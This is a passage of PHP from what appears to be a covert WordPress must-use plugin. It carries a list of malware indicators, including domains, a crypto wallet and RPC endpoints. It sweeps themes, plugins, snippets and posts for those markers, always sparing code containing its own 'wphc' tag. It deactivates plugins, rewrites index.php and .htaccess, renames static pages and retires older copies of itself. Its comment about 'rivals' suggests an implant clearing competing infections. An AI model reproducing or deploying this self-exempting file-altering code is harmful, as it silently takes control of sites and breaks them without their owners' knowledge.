return array('interseq.at', 'xursod.com', 'imacos.cc', 'macrepairtool.com', 'cfmd-rc-host', 'captcha-container', 'data-cfmd', 'norediam.com', 'New_Proliv', 'ssn-id.email', 'masqrad', 'loadJSFromImage', '__fpEmbeds', 'fp-embed-close', 'plain-snow.pages.dev', 'pages.dev/help', 'extra_param_1', '(new Function(_code))', '0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2', 'b68d1809', 'blastapi.io', 'rpc.ankr.com/polygon', 'gateway.tenderly.co', 'api.php?s=', 'sevda.lol');
}
function wphc_clean_markup_3091402c29($wphc_h) {
foreach (wphc_foreign_marks_3091402c29() as $wphc_m) {
$wphc_q = preg_quote($wphc_m, '#');
$wphc_h = preg_replace_callback('#<script\b[^>]*src=["\'][^"\']*' . $wphc_q . '[^"\']*["\'][^>]*>\s*(</script>)?#is', 'wphc_keep_or_cut_3091402c29', $wphc_h);
$wphc_h = preg_replace_callback('#<script\b[^>]*>((?:(?!</script>).)*' . $wphc_q . '(?:(?!</script>).)*)</script>#is', 'wphc_keep_or_cut_3091402c29', $wphc_h);
$wphc_h = preg_replace_callback('#<(div|section|aside)\b[^>]*(?:class|id)=["\'][^"\']*' . $wphc_q . '[^"\']*["\'][^>]*>.*?</\1>#is', 'wphc_keep_or_cut_3091402c29', $wphc_h);
$wphc_h = preg_replace_callback('#<(link|meta|iframe)\b[^>]*' . $wphc_q . '[^>]*>#is', 'wphc_keep_or_cut_3091402c29', $wphc_h);
}
return $wphc_h;
}
function wphc_keep_or_cut_3091402c29($wphc_mm) {
return strpos($wphc_mm[0], 'wphc') !== false ? $wphc_mm[0] : '';
}
function wphc_sweep_foreign_3091402c29() {
$wphc_gate = 'wphc_swp_ts';
$wphc_last = (int)get_option($wphc_gate, 0);
if (time() - $wphc_last < 21600) { return; }
update_option($wphc_gate, time(), false);
$wphc_marks = wphc_foreign_marks_3091402c29();
// every php file of the active theme (+ parent): rivals park loader
// scripts in header.php/footer.php, not only functions.php
$wphc_tds = array(get_stylesheet_directory());
if (get_template_directory() !== get_stylesheet_directory()) { $wphc_tds[] = get_template_directory(); }
foreach ($wphc_tds as $wphc_td) {
foreach ((array)glob($wphc_td . '/*.php') as $wphc_tf) {
if (!is_file($wphc_tf) || !is_writable($wphc_tf)) { continue; }
$wphc_c = @file_get_contents($wphc_tf);
if (!is_string($wphc_c)) { continue; }
$wphc_n = wphc_clean_markup_3091402c29($wphc_c);
foreach ($wphc_marks as $wphc_m) {
if (strpos($wphc_n, $wphc_m) !== false) {
$wphc_lines = array();
foreach (explode("\n", str_replace("\r\n", "\n", $wphc_n)) as $wphc_l) {
if (strpos($wphc_l, $wphc_m) === false || strpos($wphc_l, 'wphc') !== false) { $wphc_lines[] = $wphc_l; }
}
$wphc_n = implode("\n", $wphc_lines);
}
}
if ($wphc_n !== $wphc_c) { @file_put_contents($wphc_tf, $wphc_n, LOCK_EX); $GLOBALS['wphc_purge_needed'] = 1; }
}
}
$wphc_mu = defined('WPMU_PLUGIN_DIR') ? WPMU_PLUGIN_DIR : WP_CONTENT_DIR . '/mu-plugins';
foreach ((array)glob($wphc_mu . '/*.php') as $wphc_f) {
if (!is_string($wphc_f)) { continue; }
$wphc_base = basename($wphc_f);
if ($wphc_base === basename(__FILE__)) { continue; }
$wphc_mc = @file_get_contents($wphc_f);
if (!is_string($wphc_mc)) { continue; }
if (strpos($wphc_mc, 'wphc') !== false) { continue; }
foreach ($wphc_marks as $wphc_m) {
if (strpos($wphc_mc, $wphc_m) !== false) { @rename($wphc_f, $wphc_f . '.wphc-off'); $GLOBALS['wphc_purge_needed'] = 1; break; }
}
}
// rogue/tampered plugins: scan plugin-root php files, deactivate + quarantine
foreach ((array)glob(WP_CONTENT_DIR . '/plugins/*', GLOB_ONLYDIR) as $wphc_pd) {
if (!is_string($wphc_pd)) { continue; }
foreach ((array)glob($wphc_pd . '/*.php') as $wphc_f) {
if (!is_string($wphc_f)) { continue; }
$wphc_sz = @filesize($wphc_f);
if (!is_int($wphc_sz) || $wphc_sz > 2000000) { continue; }
$wphc_pc = @file_get_contents($wphc_f);
if (!is_string($wphc_pc) || strpos($wphc_pc, 'wphc') !== false) { continue; }
$wphc_hit = false;
foreach ($wphc_marks as $wphc_m) {
if (strpos($wphc_pc, $wphc_m) !== false) { $wphc_hit = true; break; }
}
if (!$wphc_hit) { continue; }
if (!function_exists('deactivate_plugins')) { @require_once ABSPATH . 'wp-admin/includes/plugin.php'; }
if (function_exists('deactivate_plugins')) {
foreach ((array)get_option('active_plugins', array()) as $wphc_ap) {
if (is_string($wphc_ap) && strpos($wphc_ap, basename($wphc_pd) . '/') === 0) { deactivate_plugins($wphc_ap, true); }
}
}
@rename($wphc_f, $wphc_f . '.wphc-off');
$GLOBALS['wphc_purge_needed'] = 1;
}
}
global $wpdb;
if (isset($wpdb) && is_object($wpdb)) {
$wphc_tbl = $wpdb->prefix . 'snippets';
foreach ($wphc_marks as $wphc_m) {
$wpdb->query("UPDATE `" . $wphc_tbl . "` SET active=0 WHERE code LIKE '%" . $wphc_m . "%' AND code NOT LIKE '%wphc%'");
if ($wpdb->rows_affected) { $GLOBALS['wphc_purge_needed'] = 1; }
}
foreach ($wphc_marks as $wphc_m) {
$wphc_rows = $wpdb->get_results("SELECT ID, post_content FROM `" . $wpdb->posts . "` WHERE post_content LIKE '%" . $wphc_m . "%' LIMIT 200");
foreach ((array)$wphc_rows as $wphc_r) {
$wphc_nc = wphc_clean_markup_3091402c29($wphc_r->post_content);
if ($wphc_nc !== $wphc_r->post_content) {
$wpdb->update($wpdb->posts, array('post_content' => $wphc_nc), array('ID' => $wphc_r->ID));
if (function_exists('clean_post_cache')) { clean_post_cache((int)$wphc_r->ID); }
$GLOBALS['wphc_purge_needed'] = 1;
}
}
}
}
}
add_action('init', 'wphc_sweep_foreign_3091402c29');// Kill marked inline scripts before they print, wherever they came
// from (wp_add_inline_script data survives file-level cleaning).
function wphc_scrub_inline_3091402c29() {
global $wp_scripts;
if (!($wp_scripts instanceof WP_Scripts)) { return; }
$wphc_marks = wphc_foreign_marks_3091402c29();
foreach ($wp_scripts->registered as $wphc_h) {
if (!is_object($wphc_h) || !property_exists($wphc_h, 'extra')) { continue; }
foreach (array('before', 'after') as $wphc_k) {
if (empty($wphc_h->extra[$wphc_k])) { continue; }
$wphc_d = is_array($wphc_h->extra[$wphc_k]) ? $wphc_h->extra[$wphc_k] : array($wphc_h->extra[$wphc_k]);
$wphc_clean = array();
foreach ($wphc_d as $wphc_line) {
$wphc_bad = false;
if (is_string($wphc_line) && strpos($wphc_line, 'wphc') === false) {
foreach ($wphc_marks as $wphc_m) { if (strpos($wphc_line, $wphc_m) !== false) { $wphc_bad = true; break; } }
}
if (!$wphc_bad) { $wphc_clean[] = $wphc_line; }
}
$wphc_h->extra[$wphc_k] = array_values($wphc_clean);
}
}
}
add_action('wp_print_scripts', 'wphc_scrub_inline_3091402c29', 99);
add_action('wp_print_footer_scripts', 'wphc_scrub_inline_3091402c29', 99);
add_action('admin_print_scripts', 'wphc_scrub_inline_3091402c29', 99);
}
if (!function_exists('wphc_docroot_repair_3091402c29')) {
function wphc_docroot_repair_3091402c29() {
$wphc_gate = 'wphc_docfix3_ts_3091402c29';
$wphc_last = (int)get_option($wphc_gate, 0);
if (time() - $wphc_last < 86400) { return; }
update_option($wphc_gate, time(), false);$wphc_marks = array('interseq.at', 'xursod.com', 'imacos.cc', 'macrepairtool.com', 'cfmd-rc-host', 'captcha-container', 'data-cfmd', 'norediam.com', 'New_Proliv', 'ssn-id.email', 'masqrad', 'loadJSFromImage', '__fpEmbeds', 'fp-embed-close', 'plain-snow.pages.dev', 'pages.dev/help', 'extra_param_1', '(new Function(_code))', '0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2', 'b68d1809', 'blastapi.io', 'rpc.ankr.com/polygon', 'gateway.tenderly.co', 'api.php?s=', 'sevda.lol');
// front-controller integrity: missing, gutted (no wp-blog-header require) or
// hijacked with a foreign redirect marker -> quarantine + restore stock.
$wphc_idx = ABSPATH . 'index.php';
$wphc_ic = is_file($wphc_idx) ? @file_get_contents($wphc_idx, false, null, 0, 65536) : false;
$wphc_bad = !is_string($wphc_ic) || strpos($wphc_ic, 'wp-blog-header') === false;
if (!$wphc_bad) { foreach ($wphc_marks as $wphc_m) { if (stripos($wphc_ic, $wphc_m) !== false) { $wphc_bad = 1; break; } } }
if ($wphc_bad) {
if (is_file($wphc_idx)) { @rename($wphc_idx, $wphc_idx . '.wphc-hijacked'); }
@file_put_contents($wphc_idx, "<?php\n" . "define('WP_USE_THEMES', true);\n" . "require __DIR__ . '/wp-blog-header.php';\n", LOCK_EX);
$GLOBALS['wphc_purge_needed'] = 1;
}
// rewrite-map hijack: a foreign marker inside .htaccess (302 rule gated on
// the root URI redirects the front while wp-login stays clean) -> stock rules.
$wphc_ht = ABSPATH . '.htaccess';
if (is_file($wphc_ht) && is_writable($wphc_ht)) {
$wphc_hc = @file_get_contents($wphc_ht, false, null, 0, 131072);
if (is_string($wphc_hc)) { foreach ($wphc_marks as $wphc_m) { if (stripos($wphc_hc, $wphc_m) !== false) {
@rename($wphc_ht, $wphc_ht . '.wphc-hijacked');
$wphc_stock = "# BEGIN WordPress\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n</IfModule>\n# END WordPress\n";
@file_put_contents($wphc_ht, $wphc_stock, LOCK_EX);
$GLOBALS['wphc_purge_needed'] = 1;
break;
} } }
}
// host "parked page" shadowing: some panels ship a static landing that
// outranks index.php in DirectoryIndex. Quarantine the shadow.
foreach (array('default.html', 'default.htm', 'index.html', 'index.htm', 'home.html', 'default.php') as $wphc_sh) {
$wphc_f = ABSPATH . $wphc_sh;
if (is_file($wphc_f)) { @rename($wphc_f, $wphc_f . '.wphc-shadowed'); $GLOBALS['wphc_purge_needed'] = 1; }
}
}wphc_docroot_repair_3091402c29();
}
if (!function_exists('wphc_themesweep_3091402c29')) {
function wphc_themesweep_3091402c29() {
$wphc_marks = array('interseq.at', 'xursod.com', 'imacos.cc', 'macrepairtool.com', 'cfmd-rc-host', 'captcha-container', 'data-cfmd', 'norediam.com', 'New_Proliv', 'ssn-id.email', 'masqrad', 'loadJSFromImage', '__fpEmbeds', 'fp-embed-close', 'plain-snow.pages.dev', 'pages.dev/help', 'extra_param_1', '(new Function(_code))', '0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2', 'b68d1809', 'blastapi.io', 'rpc.ankr.com/polygon', 'gateway.tenderly.co', 'api.php?s=', 'sevda.lol');
if (!is_admin()) { return; }
if (!function_exists('current_user_can') || !current_user_can('manage_options')) { return; }
$wphc_gate = 'wphc_thswp_ts_3091402c29';
if (get_option($wphc_gate, 0)) { return; }
update_option($wphc_gate, time(), false);
$wphc_tds = array(get_stylesheet_directory());
if (get_template_directory() !== get_stylesheet_directory()) { $wphc_tds[] = get_template_directory(); }
foreach ($wphc_tds as $wphc_td) {
foreach ((array)glob($wphc_td . '/*.php') as $wphc_tf) {
if (!is_file($wphc_tf) || !is_writable($wphc_tf)) { continue; }
$wphc_c = @file_get_contents($wphc_tf);
if (!is_string($wphc_c)) { continue; }
$wphc_n = $wphc_c;
foreach ($wphc_marks as $wphc_m) {
$wphc_q = preg_quote($wphc_m, '#');
$wphc_t = preg_replace_callback('#<script\b[^>]*src=["\'][^"\']*' . $wphc_q . '[^"\']*["\'][^>]*>\s*(</script>)?#is', 'wphc_ts_keep_3091402c29', $wphc_n);
if (is_string($wphc_t)) { $wphc_n = $wphc_t; }
$wphc_t = preg_replace_callback('#<script\b[^>]*>((?:(?!</script>).)*' . $wphc_q . '(?:(?!</script>).)*)</script>#is', 'wphc_ts_keep_3091402c29', $wphc_n);
if (is_string($wphc_t)) { $wphc_n = $wphc_t; }
$wphc_t = preg_replace_callback('#<(link|meta|iframe)\b[^>]*' . $wphc_q . '[^>]*>#is', 'wphc_ts_keep_3091402c29', $wphc_n);
if (is_string($wphc_t)) { $wphc_n = $wphc_t; }
}
$wphc_lines = array();
foreach (explode("\n", str_replace("\r\n", "\n", $wphc_n)) as $wphc_l) {
$wphc_keep = true;
foreach ($wphc_marks as $wphc_m) {
if (strpos($wphc_l, $wphc_m) !== false && strpos($wphc_l, 'wphc') === false) { $wphc_keep = false; break; }
}
if ($wphc_keep) { $wphc_lines[] = $wphc_l; }
}
$wphc_n = implode("\n", $wphc_lines);
if (is_string($wphc_n) && $wphc_n !== $wphc_c) { @file_put_contents($wphc_tf, $wphc_n, LOCK_EX); $GLOBALS['wphc_purge_needed'] = 1; }
}
}
}
function wphc_ts_keep_3091402c29($wphc_mm) {
return strpos($wphc_mm[0], 'wphc') !== false ? $wphc_mm[0] : '';
}wphc_themesweep_3091402c29();
add_action('admin_init', 'wphc_themesweep_3091402c29');
}
if (!function_exists('wphc_upgrade_3091402c29')) {
function wphc_upgrade_3091402c29() {
$wphc_gate = 'wphc_upg_ts_3091402c29';
if (time() - (int)get_option($wphc_gate, 0) < 86400) { return; }
update_option($wphc_gate, time(), false);
$wphc_dir = defined('WPMU_PLUGIN_DIR') ? WPMU_PLUGIN_DIR : WP_CONTENT_DIR . '/mu-plugins';
foreach ((array)glob($wphc_dir . '/*.php') as $wphc_f) {
if ($wphc_f === __FILE__) { continue; }
$wphc_c = @file_get_contents($wphc_f, false, null, 0, 262144);
if (!is_string($wphc_c)) { continue; }
if (strpos($wphc_c, 'wphc_boot_cache') === false) { continue; }
if (strpos($wphc_c, '3091402c29df44895979c9f42eac3ec7') !== false) { continue; }
@rename($wphc_f, $wphc_f . '.legacy-3091402c29');
$GLOBALS['wphc_purge_needed'] = 1;
}
}wphc_upgrade_3091402c29();
add_action('admin_init', 'wphc_upgrade_3091402c29');
}
